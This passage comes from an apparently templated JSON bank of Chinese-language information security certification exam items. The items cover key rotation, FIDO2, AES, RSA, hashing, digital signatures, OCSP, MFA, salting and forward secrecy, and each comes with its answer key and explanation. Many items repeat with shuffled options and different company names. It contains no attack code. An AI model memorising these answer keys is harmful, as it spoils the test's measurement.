      "C. 降低金鑰長度至 56-bit",
      "D. 定期執行金鑰輪替（Key Rotation），生成新金鑰並汰換老舊金鑰"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "金鑰有其安全生命週期（Cryptoperiod），長期不更換會增加金鑰洩漏與密文累積遭分析破解之風險，必須依規定期輪替（Rotation）。",
    "trap": "金鑰管理必須包含生成、使用、存儲、輪替、撤銷到銷毀的全生命週期控管。",
    "law": "NIST SP 800-57 金鑰管理指引"
  },
  {
    "id": "IPAS-B-560",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某金流與行動支付科技公司為高階主管配發 FIDO2 硬體安全金鑰進行登入驗證。依據驗證因子三要素，此實體硬體金鑰屬於何種類別？",
    "options": [
      "A. 所知（Something you know）",
      "B. 所處（Somewhere you are）",
      "C. 所持（Something you have）",
      "D. 所具（Something you are）"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "FIDO2",
        "zh": "快速線上身分識別 2.0",
        "ipa": "/ˈfaɪ.doʊ tuː/"
      }
    ],
    "explanation": "實體硬體金鑰（如 YubiKey、智慧卡、USB Token）屬於使用者持有的實體載具，歸類為『所持』因子。",
    "trap": "若金鑰本身附帶指紋辨識，則結合了所持與所具雙因子。",
    "law": "NIST SP 800-63B"
  },
  {
    "id": "IPAS-B-561",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心資料工程師需要對儲存於磁碟陣列中高達 10TB 的顧客交易歷史資料進行全量靜態加密（Data at Rest Encryption）。考量大量資料加密的運算效能與安全強度，最適當之加密演算法為：",
    "options": [
      "A. MD5（單向雜湊演算法）",
      "B. RSA-4096（非對稱演算法）",
      "C. AES-256（進階加密標準，具極高運算效能與強安全性）",
      "D. Caesar 凱薩密碼"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "AES",
        "zh": "進階加密標準 (對稱式)",
        "ipa": "/ˌeɪ.iːˈes/"
      },
      {
        "en": "RSA",
        "zh": "RSA 非對稱加密演算法",
        "ipa": "/ˌɑːr.esˈeɪ/"
      }
    ],
    "explanation": "AES-256 為對稱式區塊加密，運算極為迅速且耗費資源少，是大量資料（Data at Rest）加密的首選；非對稱加密過於緩慢不適於大資料直接加密。",
    "trap": "切勿選擇 RSA 進行全量大資料儲存加密，效率會嚴重低落。",
    "law": "NIST SP 800-175B"
  },
  {
    "id": "IPAS-B-562",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心規劃於網際網路上由客戶端向伺服器安全傳送機密合約，若採用 RSA 非對稱加密機制確保該合約「僅有伺服器能夠解密閱讀」，客戶端應使用何種金鑰進行加密？",
    "options": [
      "A. 客戶端自己的私鑰",
      "B. 伺服器的公鑰（Server's Public Key）",
      "C. 伺服器的私鑰（Server's Private Key）",
      "D. 客戶端自己的公鑰"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "RSA",
        "zh": "RSA 非對稱加密演算法",
        "ipa": "/ˌɑːr.esˈeɪ/"
      }
    ],
    "explanation": "機密傳輸原則：使用『接收方的公鑰』加密，唯有持有對應私鑰的接收方（伺服器）方能解密閱讀。",
    "trap": "私鑰絕不可公開給他人使用，公鑰才是公開給大眾加密傳給自己。",
    "law": "PKI 基礎原理"
  },
  {
    "id": "IPAS-B-563",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心軟體發布平台為讓使用者下載安裝檔時能夠驗證軟體在傳輸過程中未遭惡意竄改，在官方網站上公佈了安裝檔的 SHA-256 雜湊值。此應用主要利用了雜湊函數的何種安全特性？",
    "options": [
      "A. 資料機密性（Confidentiality）加密",
      "B. 資料完整性（Integrity）驗證，確保檔案未遭竄改或損毀",
      "C. 伺服器身分鑑別",
      "D. 交易不可否認性"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "Confidentiality",
        "zh": "機密性",
        "ipa": "/ˌkɑːn.fə.den.ʃiˈæl.ə.t̬i/"
      },
      {
        "en": "Integrity",
        "zh": "完整性",
        "ipa": "/ɪnˈteɡ.rə.t̬i/"
      },
      {
        "en": "SHA-256",
        "zh": "安全雜湊演算法 256 位元",
        "ipa": "/ʃɑː tuː fɪf.ti sɪks/"
      }
    ],
    "explanation": "雜湊函數具單向性與抗碰撞性，檔案遭竄改哪怕 1 個 bit 雜湊值即劇烈改變，因此適合用作完整性比對校驗。",
    "trap": "單純提供 Hash 無法達成不可否認性（因未綁定個人私鑰簽章）。",
    "law": "NIST FIPS 180-4"
  },
  {
    "id": "IPAS-B-564",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某高科技晶圓代工大廠為推動電子採購系統，要求投標廠商送出的標單必須具備法律證據能力，確保標單內容未被變造且廠商事後無法推諉否認投標。該系統必須採用下列何種密碼學機制？",
    "options": [
      "A. 設定高強度資料庫密碼",
      "B. 建立 VPN 虛擬私人通道",
      "C. 對稱式 AES-128 加密",
      "D. 數位簽章（Digital Signature，利用投標廠商專屬私鑰簽署）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "VPN",
        "zh": "虛擬私人網路",
        "ipa": "/ˌviː.piːˈen/"
      },
      {
        "en": "AES",
        "zh": "進階加密標準 (對稱式)",
        "ipa": "/ˌeɪ.iːˈes/"
      },
      {
        "en": "Digital Signature",
        "zh": "數位簽章",
        "ipa": "/ˈdɪdʒ.ə.t̬əl ˈsɪɡ.nə.tʃɚ/"
      }
    ],
    "explanation": "數位簽章結合非對稱密碼學私鑰專屬性與 Hash 完整性，兼具完整性、真實性與法律上的不可否認性。",
    "trap": "對稱加密雙方皆有金鑰，事後雙方皆可推諉是對方偽造。",
    "law": "《電子簽章法》第9條"
  },
  {
    "id": "IPAS-B-565",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某區域教學醫學中心內部伺服器申請了一張由知名商用 CA 簽發之 SSL 數位憑證，當訪客瀏覽器連線時出現「憑證已撤銷（Certificate Revoked）」之警告。瀏覽器最可能是透過何種協定即時查詢得知該憑證已被註銷？",
    "options": [
      "A. OCSP（線上憑證狀態協定）",
      "B. DNS 解析協定",
      "C. SMTP 郵件傳輸協定",
      "D. Telnet 協定"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "CA",
        "zh": "憑證授權中心",
        "ipa": "/ˌsiːˈeɪ/"
      },
      {
        "en": "OCSP",
        "zh": "線上憑證狀態協定",
        "ipa": "/ˌoʊ.siː.esˈpiː/"
      }
    ],
    "explanation": "OCSP 提供即時、輕量之線上查詢機制，瀏覽器可向 CA 之 OCSP Responder 查詢單張憑證目前是否已被撤銷。",
    "trap": "CRL 檔案龐大且更新具時間延遲，OCSP 反應更即時。",
    "law": "RFC 6960"
  },
  {
    "id": "IPAS-B-566",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商為防止遠端辦公同仁的帳密在網路釣魚事件中遭竊取並被直接登入，資訊長下令所有遠端 VPN 連線必須全面導入多因素驗證（MFA）。下列何種驗證組合符合真正之 MFA 規範？",
    "options": [
      "A. 英文密碼 ＋ 數字密碼（兩者皆為所知）",
      "B. 網域帳號密碼 ＋ 個人提款卡密碼（兩者皆為所知）",
      "C. 員工工號 ＋ 身份證字號（兩者皆為所知）",
      "D. 網域帳號密碼（所知）＋ 手機 Authenticator App 產生的動態 OTP（所持）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "VPN",
        "zh": "虛擬私人網路",
        "ipa": "/ˌviː.piːˈen/"
      },
      {
        "en": "MFA",
        "zh": "多因素驗證",
        "ipa": "/ˌem.efˈeɪ/"
      }
    ],
    "explanation": "真正的 MFA 必須跨越不同類別（例如所知 + 所持，或所知 + 所具）。若輸入兩次密碼依然屬於同一維度（Something you know）。",
    "trap": "考題常以「密碼 + 媽媽娘家姓氏」誘騙考生，兩者本質皆為所知，非 MFA。",
    "law": "NIST SP 800-63B"
  },
  {
    "id": "IPAS-B-567",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠在進行資料庫密碼安全性盤點時，工程師建議密碼雜湊運算時必須強制為每位使用者加入唯一的「鹽（Salt）」。加入 Salt 的最核心防禦目的為何？",
    "options": [
      "A. 減少資料庫儲存空間",
      "B. 讓密碼可以在遺忘時輕鬆還原明文",
      "C. 使相同密碼的使用者產生截然不同的雜湊值，徹底瓦解預先計算之彩虹表攻擊",
      "D. 加快密碼雜湊運算速度以降低 CPU 負擔"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "加鹽（Salt）為每位使用者附加一串隨機亂數再計算 Hash，使預先算好的彩虹表完全失效，攻擊者必須針對每筆帳號個別暴力破解。",
    "trap": "Salt 並非密鑰，可以直接明文存放在資料庫中。",
    "law": "OWASP 密碼儲存安全備忘錄"
  },
  {
    "id": "IPAS-B-568",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某金流與行動支付科技公司資安架構師在評估企業 TLS 通訊安全時，強調加密套件必須具備「前向保密性（PFS, Perfect Forward Secrecy）」。具備 PFS 的核心優勢在於：",
    "options": [
      "A. 即使日後伺服器長效私鑰遭洩漏，攻擊者亦無法解密過往已攔截儲存的歷史加密連線內容",
      "B. 能夠防止受害者遭遇釣魚網站欺騙",
      "C. 能夠完全取代防火牆",
      "D. 能讓傳輸速度提升 100 倍"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "TLS",
        "zh": "傳輸層安全性協定",
        "ipa": "/ˌtiː.elˈes/"
      }
    ],
    "explanation": "前向保密（PFS）在每次工作階段中動態生成一次性臨時金鑰（如 DHE/ECDHE），長效私鑰僅用於身分驗證，私鑰洩漏無法回溯推導工作階段金鑰。",
    "trap": "非常關鍵的現代加密標準考點。",
    "law": "RFC 8446 TLS 1.3 核心要求"
  },
  {
    "id": "IPAS-B-569",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某大型連鎖量販流通集團內部加密主機使用的對稱式主金鑰（Master Key）已持續使用超過三年從未變更。依據金鑰生命週期管理（Key Lifecycle Management）規範，資安長應要求採取何種措施？",
    "options": [
      "A. 只要沒被偷就可以永久使用無需變更",
      "B. 定期執行金鑰輪替（Key Rotation），生成新金鑰並汰換老舊金鑰",
      "C. 將金鑰直接張貼於內部公告欄以利備份",
      "D. 降低金鑰長度至 56-bit"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "金鑰有其安全生命週期（Cryptoperiod），長期不更換會增加金鑰洩漏與密文累積遭分析破解之風險，必須依規定期輪替（Rotation）。",
    "trap": "金鑰管理必須包含生成、使用、存儲、輪替、撤銷到銷毀的全生命週期控管。",
    "law": "NIST SP 800-57 金鑰管理指引"
  },
  {
    "id": "IPAS-B-570",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某知名大型網路電商平台為高階主管配發 FIDO2 硬體安全金鑰進行登入驗證。依據驗證因子三要素，此實體硬體金鑰屬於何種類別？",
    "options": [
      "A. 所處（Somewhere you are）",
      "B. 所知（Something you know）",
      "C. 所具（Something you are）",
      "D. 所持（Something you have）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "FIDO2",
        "zh": "快速線上身分識別 2.0",
        "ipa": "/ˈfaɪ.doʊ tuː/"
      }
    ],
    "explanation": "實體硬體金鑰（如 YubiKey、智慧卡、USB Token）屬於使用者持有的實體載具，歸類為『所持』因子。",
    "trap": "若金鑰本身附帶指紋辨識，則結合了所持與所具雙因子。",
    "law": "NIST SP 800-63B"
  },
  {
    "id": "IPAS-B-571",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某國際航運物流貨櫃集團資料工程師需要對儲存於磁碟陣列中高達 10TB 的顧客交易歷史資料進行全量靜態加密（Data at Rest Encryption）。考量大量資料加密的運算效能與安全強度，最適當之加密演算法為：",
    "options": [
      "A. RSA-4096（非對稱演算法）",
      "B. Caesar 凱薩密碼",
      "C. AES-256（進階加密標準，具極高運算效能與強安全性）",
      "D. MD5（單向雜湊演算法）"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "AES",
        "zh": "進階加密標準 (對稱式)",
        "ipa": "/ˌeɪ.iːˈes/"
      },
      {
        "en": "RSA",
        "zh": "RSA 非對稱加密演算法",
        "ipa": "/ˌɑːr.esˈeɪ/"
      }
    ],
    "explanation": "AES-256 為對稱式區塊加密，運算極為迅速且耗費資源少，是大量資料（Data at Rest）加密的首選；非對稱加密過於緩慢不適於大資料直接加密。",
    "trap": "切勿選擇 RSA 進行全量大資料儲存加密，效率會嚴重低落。",
    "law": "NIST SP 800-175B"
  },
  {
    "id": "IPAS-B-572",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某高科技晶圓代工大廠規劃於網際網路上由客戶端向伺服器安全傳送機密合約，若採用 RSA 非對稱加密機制確保該合約「僅有伺服器能夠解密閱讀」，客戶端應使用何種金鑰進行加密？",
    "options": [
      "A. 客戶端自己的私鑰",
      "B. 伺服器的公鑰（Server's Public Key）",
      "C. 客戶端自己的公鑰",
      "D. 伺服器的私鑰（Server's Private Key）"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "RSA",
        "zh": "RSA 非對稱加密演算法",
        "ipa": "/ˌɑːr.esˈeɪ/"
      }
    ],
    "explanation": "機密傳輸原則：使用『接收方的公鑰』加密，唯有持有對應私鑰的接收方（伺服器）方能解密閱讀。",
    "trap": "私鑰絕不可公開給他人使用，公鑰才是公開給大眾加密傳給自己。",
    "law": "PKI 基礎原理"
  },
  {
    "id": "IPAS-B-573",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某區域教學醫學中心軟體發布平台為讓使用者下載安裝檔時能夠驗證軟體在傳輸過程中未遭惡意竄改，在官方網站上公佈了安裝檔的 SHA-256 雜湊值。此應用主要利用了雜湊函數的何種安全特性？",
    "options": [
      "A. 資料完整性（Integrity）驗證，確保檔案未遭竄改或損毀",
      "B. 資料機密性（Confidentiality）加密",
      "C. 伺服器身分鑑別",
      "D. 交易不可否認性"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "Confidentiality",
        "zh": "機密性",
        "ipa": "/ˌkɑːn.fə.den.ʃiˈæl.ə.t̬i/"
      },
      {
        "en": "Integrity",
        "zh": "完整性",
        "ipa": "/ɪnˈteɡ.rə.t̬i/"
      },
      {
        "en": "SHA-256",
        "zh": "安全雜湊演算法 256 位元",
        "ipa": "/ʃɑː tuː fɪf.ti sɪks/"
      }
    ],
    "explanation": "雜湊函數具單向性與抗碰撞性，檔案遭竄改哪怕 1 個 bit 雜湊值即劇烈改變，因此適合用作完整性比對校驗。",
    "trap": "單純提供 Hash 無法達成不可否認性（因未綁定個人私鑰簽章）。",
    "law": "NIST FIPS 180-4"
  },
  {
    "id": "IPAS-B-574",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某跨國金融控股銀行為推動電子採購系統，要求投標廠商送出的標單必須具備法律證據能力，確保標單內容未被變造且廠商事後無法推諉否認投標。該系統必須採用下列何種密碼學機制？",
    "options": [
      "A. 數位簽章（Digital Signature，利用投標廠商專屬私鑰簽署）",
      "B. 設定高強度資料庫密碼",
      "C. 建立 VPN 虛擬私人通道",
      "D. 對稱式 AES-128 加密"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "VPN",
        "zh": "虛擬私人網路",
        "ipa": "/ˌviː.piːˈen/"
      },
      {
        "en": "AES",
        "zh": "進階加密標準 (對稱式)",
        "ipa": "/ˌeɪ.iːˈes/"
      },
      {
        "en": "Digital Signature",
        "zh": "數位簽章",
        "ipa": "/ˈdɪdʒ.ə.t̬əl ˈsɪɡ.nə.tʃɚ/"
      }
    ],
    "explanation": "數位簽章結合非對稱密碼學私鑰專屬性與 Hash 完整性，兼具完整性、真實性與法律上的不可否認性。",
    "trap": "對稱加密雙方皆有金鑰，事後雙方皆可推諉是對方偽造。",
    "law": "《電子簽章法》第9條"
  },
  {
    "id": "IPAS-B-575",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某跨國金融控股銀行內部伺服器申請了一張由知名商用 CA 簽發之 SSL 數位憑證，當訪客瀏覽器連線時出現「憑證已撤銷（Certificate Revoked）」之警告。瀏覽器最可能是透過何種協定即時查詢得知該憑證已被註銷？",
    "options": [
      "A. SMTP 郵件傳輸協定",
      "B. DNS 解析協定",
      "C. OCSP（線上憑證狀態協定）",
      "D. Telnet 協定"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "CA",
        "zh": "憑證授權中心",
        "ipa": "/ˌsiːˈeɪ/"
      },
      {
        "en": "OCSP",
        "zh": "線上憑證狀態協定",
        "ipa": "/ˌoʊ.siː.esˈpiː/"
      }
    ],
    "explanation": "OCSP 提供即時、輕量之線上查詢機制，瀏覽器可向 CA 之 OCSP Responder 查詢單張憑證目前是否已被撤銷。",
    "trap": "CRL 檔案龐大且更新具時間延遲，OCSP 反應更即時。",
    "law": "RFC 6960"
  },
  {
    "id": "IPAS-B-576",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某區域教學醫學中心為防止遠端辦公同仁的帳密在網路釣魚事件中遭竊取並被直接登入，資訊長下令所有遠端 VPN 連線必須全面導入多因素驗證（MFA）。下列何種驗證組合符合真正之 MFA 規範？",
    "options": [
      "A. 員工工號 ＋ 身份證字號（兩者皆為所知）",
      "B. 網域帳號密碼（所知）＋ 手機 Authenticator App 產生的動態 OTP（所持）",
      "C. 網域帳號密碼 ＋ 個人提款卡密碼（兩者皆為所知）",
      "D. 英文密碼 ＋ 數字密碼（兩者皆為所知）"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "VPN",
        "zh": "虛擬私人網路",
        "ipa": "/ˌviː.piːˈen/"
      },
      {
        "en": "MFA",
        "zh": "多因素驗證",
        "ipa": "/ˌem.efˈeɪ/"
      }
    ],
    "explanation": "真正的 MFA 必須跨越不同類別（例如所知 + 所持，或所知 + 所具）。若輸入兩次密碼依然屬於同一維度（Something you know）。",
    "trap": "考題常以「密碼 + 媽媽娘家姓氏」誘騙考生，兩者本質皆為所知，非 MFA。",
    "law": "NIST SP 800-63B"
  },
  {
    "id": "IPAS-B-577",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某國際航運物流貨櫃集團在進行資料庫密碼安全性盤點時，工程師建議密碼雜湊運算時必須強制為每位使用者加入唯一的「鹽（Salt）」。加入 Salt 的最核心防禦目的為何？",
    "options": [
      "A. 使相同密碼的使用者產生截然不同的雜湊值，徹底瓦解預先計算之彩虹表攻擊",
      "B. 加快密碼雜湊運算速度以降低 CPU 負擔",
      "C. 讓密碼可以在遺忘時輕鬆還原明文",
      "D. 減少資料庫儲存空間"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "加鹽（Salt）為每位使用者附加一串隨機亂數再計算 Hash，使預先算好的彩虹表完全失效，攻擊者必須針對每筆帳號個別暴力破解。",
    "trap": "Salt 並非密鑰，可以直接明文存放在資料庫中。",
    "law": "OWASP 密碼儲存安全備忘錄"
  },
  {
    "id": "IPAS-B-578",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商資安架構師在評估企業 TLS 通訊安全時，強調加密套件必須具備「前向保密性（PFS, Perfect Forward Secrecy）」。具備 PFS 的核心優勢在於：",
    "options": [
      "A. 能夠完全取代防火牆",
      "B. 能夠防止受害者遭遇釣魚網站欺騙",
      "C. 能讓傳輸速度提升 100 倍",
      "D. 即使日後伺服器長效私鑰遭洩漏，攻擊者亦無法解密過往已攔截儲存的歷史加密連線內容"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "TLS",
        "zh": "傳輸層安全性協定",
        "ipa": "/ˌtiː.elˈes/"
      }
    ],
    "explanation": "前向保密（PFS）在每次工作階段中動態生成一次性臨時金鑰（如 DHE/ECDHE），長效私鑰僅用於身分驗證，私鑰洩漏無法回溯推導工作階段金鑰。",
    "trap": "非常關鍵的現代加密標準考點。",
    "law": "RFC 8446 TLS 1.3 核心要求"
  },
  {
    "id": "IPAS-B-579",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某高科技晶圓代工大廠內部加密主機使用的對稱式主金鑰（Master Key）已持續使用超過三年從未變更。依據金鑰生命週期管理（Key Lifecycle Management）規範，資安長應要求採取何種措施？",
    "options": [
      "A. 降低金鑰長度至 56-bit",
      "B. 定期執行金鑰輪替（Key Rotation），生成新金鑰並汰換老舊金鑰",
      "C. 將金鑰直接張貼於內部公告欄以利備份",
      "D. 只要沒被偷就可以永久使用無需變更"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "金鑰有其安全生命週期（Cryptoperiod），長期不更換會增加金鑰洩漏與密文累積遭分析破解之風險，必須依規定期輪替（Rotation）。",
    "trap": "金鑰管理必須包含生成、使用、存儲、輪替、撤銷到銷毀的全生命週期控管。",
    "law": "NIST SP 800-57 金鑰管理指引"
  },
  {
    "id": "IPAS-B-580",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某高科技晶圓代工大廠為高階主管配發 FIDO2 硬體安全金鑰進行登入驗證。依據驗證因子三要素，此實體硬體金鑰屬於何種類別？",
    "options": [
      "A. 所具（Something you are）",
      "B. 所持（Something you have）",
      "C. 所知（Something you know）",
      "D. 所處（Somewhere you are）"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "FIDO2",
        "zh": "快速線上身分識別 2.0",
        "ipa": "/ˈfaɪ.doʊ tuː/"
      }
    ],
    "explanation": "實體硬體金鑰（如 YubiKey、智慧卡、USB Token）屬於使用者持有的實體載具，歸類為『所持』因子。",
    "trap": "若金鑰本身附帶指紋辨識，則結合了所持與所具雙因子。",
    "law": "NIST SP 800-63B"
  },
  {
    "id": "IPAS-B-581",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某國際航運物流貨櫃集團資料工程師需要對儲存於磁碟陣列中高達 10TB 的顧客交易歷史資料進行全量靜態加密（Data at Rest Encryption）。考量大量資料加密的運算效能與安全強度，最適當之加密演算法為：",
    "options": [
      "A. MD5（單向雜湊演算法）",
      "B. RSA-4096（非對稱演算法）",
      "C. Caesar 凱薩密碼",
      "D. AES-256（進階加密標準，具極高運算效能與強安全性）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "AES",
        "zh": "進階加密標準 (對稱式)",
        "ipa": "/ˌeɪ.iːˈes/"
      },
      {
        "en": "RSA",
        "zh": "RSA 非對稱加密演算法",
        "ipa": "/ˌɑːr.esˈeɪ/"
      }
    ],
    "explanation": "AES-256 為對稱式區塊加密，運算極為迅速且耗費資源少，是大量資料（Data at Rest）加密的首選；非對稱加密過於緩慢不適於大資料直接加密。",
    "trap": "切勿選擇 RSA 進行全量大資料儲存加密，效率會嚴重低落。",
    "law": "NIST SP 800-175B"
  },
  {
    "id": "IPAS-B-582",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某高科技晶圓代工大廠規劃於網際網路上由客戶端向伺服器安全傳送機密合約，若採用 RSA 非對稱加密機制確保該合約「僅有伺服器能夠解密閱讀」，客戶端應使用何種金鑰進行加密？",
    "options": [
      "A. 客戶端自己的私鑰",
      "B. 伺服器的公鑰（Server's Public Key）",
      "C. 伺服器的私鑰（Server's Private Key）",
      "D. 客戶端自己的公鑰"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "RSA",
        "zh": "RSA 非對稱加密演算法",
        "ipa": "/ˌɑːr.esˈeɪ/"
      }
    ],
    "explanation": "機密傳輸原則：使用『接收方的公鑰』加密，唯有持有對應私鑰的接收方（伺服器）方能解密閱讀。",
    "trap": "私鑰絕不可公開給他人使用，公鑰才是公開給大眾加密傳給自己。",
    "law": "PKI 基礎原理"
  },
  {
    "id": "IPAS-B-583",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某區域教學醫學中心軟體發布平台為讓使用者下載安裝檔時能夠驗證軟體在傳輸過程中未遭惡意竄改，在官方網站上公佈了安裝檔的 SHA-256 雜湊值。此應用主要利用了雜湊函數的何種安全特性？",
    "options": [
      "A. 資料完整性（Integrity）驗證，確保檔案未遭竄改或損毀",
      "B. 交易不可否認性",
      "C. 資料機密性（Confidentiality）加密",
      "D. 伺服器身分鑑別"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "Confidentiality",
        "zh": "機密性",
        "ipa": "/ˌkɑːn.fə.den.ʃiˈæl.ə.t̬i/"
      },
      {
        "en": "Integrity",
        "zh": "完整性",
        "ipa": "/ɪnˈteɡ.rə.t̬i/"
      },
      {
        "en": "SHA-256",
        "zh": "安全雜湊演算法 256 位元",
        "ipa": "/ʃɑː tuː fɪf.ti sɪks/"
      }
    ],
    "explanation": "雜湊函數具單向性與抗碰撞性，檔案遭竄改哪怕 1 個 bit 雜湊值即劇烈改變，因此適合用作完整性比對校驗。",
    "trap": "單純提供 Hash 無法達成不可否認性（因未綁定個人私鑰簽章）。",
    "law": "NIST FIPS 180-4"
  },
  {
    "id": "IPAS-B-584",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某金流與行動支付科技公司為推動電子採購系統，要求投標廠商送出的標單必須具備法律證據能力，確保標單內容未被變造且廠商事後無法推諉否認投標。該系統必須採用下列何種密碼學機制？",
    "options": [
      "A. 建立 VPN 虛擬私人通道",
      "B. 數位簽章（Digital Signature，利用投標廠商專屬私鑰簽署）",
      "C. 對稱式 AES-128 加密",
      "D. 設定高強度資料庫密碼"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "VPN",
        "zh": "虛擬私人網路",
        "ipa": "/ˌviː.piːˈen/"
      },
      {
        "en": "AES",
        "zh": "進階加密標準 (對稱式)",
        "ipa": "/ˌeɪ.iːˈes/"
      },
      {
        "en": "Digital Signature",
        "zh": "數位簽章",
        "ipa": "/ˈdɪdʒ.ə.t̬əl ˈsɪɡ.nə.tʃɚ/"
      }
    ],
    "explanation": "數位簽章結合非對稱密碼學私鑰專屬性與 Hash 完整性，兼具完整性、真實性與法律上的不可否認性。",
    "trap": "對稱加密雙方皆有金鑰，事後雙方皆可推諉是對方偽造。",
    "law": "《電子簽章法》第9條"
  },
  {
    "id": "IPAS-B-585",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某公務機關資訊處內部伺服器申請了一張由知名商用 CA 簽發之 SSL 數位憑證，當訪客瀏覽器連線時出現「憑證已撤銷（Certificate Revoked）」之警告。瀏覽器最可能是透過何種協定即時查詢得知該憑證已被註銷？",
    "options": [
      "A. OCSP（線上憑證狀態協定）",
      "B. Telnet 協定",
      "C. SMTP 郵件傳輸協定",
      "D. DNS 解析協定"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "CA",
        "zh": "憑證授權中心",
        "ipa": "/ˌsiːˈeɪ/"
      },
      {
        "en": "OCSP",
        "zh": "線上憑證狀態協定",
        "ipa": "/ˌoʊ.siː.esˈpiː/"
      }
    ],
    "explanation": "OCSP 提供即時、輕量之線上查詢機制，瀏覽器可向 CA 之 OCSP Responder 查詢單張憑證目前是否已被撤銷。",
    "trap": "CRL 檔案龐大且更新具時間延遲，OCSP 反應更即時。",
    "law": "RFC 6960"
  },
  {
    "id": "IPAS-B-586",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某跨國金融控股銀行為防止遠端辦公同仁的帳密在網路釣魚事件中遭竊取並被直接登入，資訊長下令所有遠端 VPN 連線必須全面導入多因素驗證（MFA）。下列何種驗證組合符合真正之 MFA 規範？",
    "options": [
      "A. 網域帳號密碼（所知）＋ 手機 Authenticator App 產生的動態 OTP（所持）",
      "B. 英文密碼 ＋ 數字密碼（兩者皆為所知）",
      "C. 員工工號 ＋ 身份證字號（兩者皆為所知）",
      "D. 網域帳號密碼 ＋ 個人提款卡密碼（兩者皆為所知）"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "VPN",
